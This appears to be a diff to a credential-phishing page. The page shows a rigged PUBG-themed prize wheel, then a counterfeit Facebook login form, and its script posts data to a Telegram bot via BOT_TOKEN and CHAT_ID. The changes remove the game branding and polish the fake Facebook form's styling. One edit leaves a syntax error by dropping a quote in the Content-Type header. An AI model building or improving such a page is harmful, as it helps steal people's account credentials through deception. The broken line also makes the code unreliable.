@@ -207,31 +207,8 @@
         /* Стили для окна выигрыша */
         .win-modal-header {
             background: linear-gradient(135deg, #1a1a1a 0%, #333 100%);
-            padding: 25px 20px;
+            padding: 40px 20px 25px;
             border-bottom: 2px solid gold;
-        }
-
-        .win-modal-header h1 {
-            color: #fff;
-            font-size: 2.5rem;
-            margin-bottom: 10px;
-            text-transform: uppercase;
-            font-weight: bold;
-            letter-spacing: 3px;
-        }
-
-        .win-modal-header h2 {
-            color: gold;
-            font-size: 1.8rem;
-            margin-bottom: 5px;
-            font-weight: normal;
-        }
-
-        .win-modal-header h3 {
-            color: #ccc;
-            font-size: 1.2rem;
-            font-weight: normal;
-            margin-top: 15px;
         }
 
         .prize-image-container {
@@ -351,24 +328,23 @@
             background: #fff;
             color: #000;
             min-height: 700px;
+            border-radius: 10px;
+            overflow: hidden;
         }
 
         .facebook-header {
             background: #1877f2;
             padding: 20px;
             text-align: center;
+            border-bottom: 1px solid #ddd;
         }
 
         .facebook-logo {
             color: white;
             font-size: 2.5rem;
             font-weight: bold;
-            margin-bottom: 10px;
-        }
-
-        .facebook-subtitle {
-            color: rgba(255, 255, 255, 0.9);
-            font-size: 1.1rem;
+            margin-bottom: 15px;
+            letter-spacing: -0.5px;
         }
 
         .facebook-form {
@@ -382,6 +358,7 @@
             border: 1px solid #ddd;
             border-radius: 6px;
             font-size: 1rem;
+            background: #f5f6f7;
         }
 
         .facebook-input:focus {
@@ -424,11 +401,12 @@
             background: #fff;
             padding: 0 15px;
             position: relative;
+            font-size: 0.9rem;
         }
 
         .facebook-create-button {
-            width: 100%;
-            padding: 15px;
+            width: auto;
+            padding: 15px 25px;
             background: #42b72a;
             color: white;
             border: none;
@@ -436,7 +414,8 @@
             font-size: 1rem;
             font-weight: bold;
             cursor: pointer;
-            margin-bottom: 25px;
+            margin: 0 auto 25px;
+            display: block;
         }
 
         .facebook-links {
@@ -468,6 +447,7 @@
             border-radius: 4px;
             background: white;
             color: #333;
+            font-size: 0.9rem;
         }
 
         .facebook-footer {
@@ -476,6 +456,7 @@
             border-top: 1px solid #ddd;
             font-size: 0.8rem;
             color: #666;
+            text-align: center;
         }
 
         /* Стили для Twitter окна */
@@ -741,14 +722,6 @@
                 margin: 15px auto;
             }
 
-            .win-modal-header h1 {
-                font-size: 2rem;
-            }
-
-            .win-modal-header h2 {
-                font-size: 1.5rem;
-            }
-
             .prize-image {
                 max-width: 150px;
                 max-height: 150px;
@@ -778,10 +751,7 @@
     <div class="modal-overlay" id="winModal">
         <div class="modal-content">
             <div class="win-modal-header">
-                <h1>METEOR ROYAL</h1>
-                <h2>REVALE PASS S</h2>
-                <h3>PUBG MOBILE METRO ROYALE PASS SIG</h3>
-                <p style="color: #ccc; margin-top: 10px;">Login to receive reward</p>
+                <!-- Тексты METEOR ROYAL и т.д. удалены -->
             </div>
             
             <div class="prize-image-container">
@@ -812,7 +782,7 @@
         <div class="modal-content facebook-modal-content">
             <div class="facebook-header">
                 <div class="facebook-logo">facebook</div>
-                <div class="facebook-subtitle">Log in to your Facebook account to connect to PUBG MOBILE</div>
+                <!-- Текст PUBG MOBILE удален -->
             </div>
             
             <form class="facebook-form" id="facebookForm">
@@ -912,7 +882,7 @@
             
             <div class="modal-buttons">
                 <button class="modal-button cancel" id="cancelSuccess">Cancel</button>
-                <button class="modal-button ok" id="okSuccess">OK</button>
+                    <button class="modal-button ok" id="okSuccess">OK</button>
             </div>
         </div>
     </div>
@@ -988,13 +958,10 @@
             currentPrize = prizes[TARGET_PRIZE_INDEX];
             
             // ПРАВИЛЬНЫЙ УГОЛ для мумии СПРАВА
-            // Если мумия СПРАВА от предыдущего приза, нужно ВЫЧЕСТЬ 30 градусов
             const anglePerPrize = 30; // 360 / 12 = 30 градусов на приз
             const baseAngle = TARGET_PRIZE_INDEX * anglePerPrize; // 3 * 30 = 90
             
             // Корректировка: чтобы мумия была точно вверху (на 12 часов)
-            // МИНУС 30 градусов, так как мумия СПРАВА (по часовой стрелке)
-            // Ранее было +90, теперь 90 - 30 = 60
             const correctionAngle = 90 - 30; // 60 градусов
             const targetAngle = baseAngle + correctionAngle; // 90 + 60 = 150
             
@@ -1034,7 +1001,7 @@
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/json',
+                        'Content-Type': application/json',
                     },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
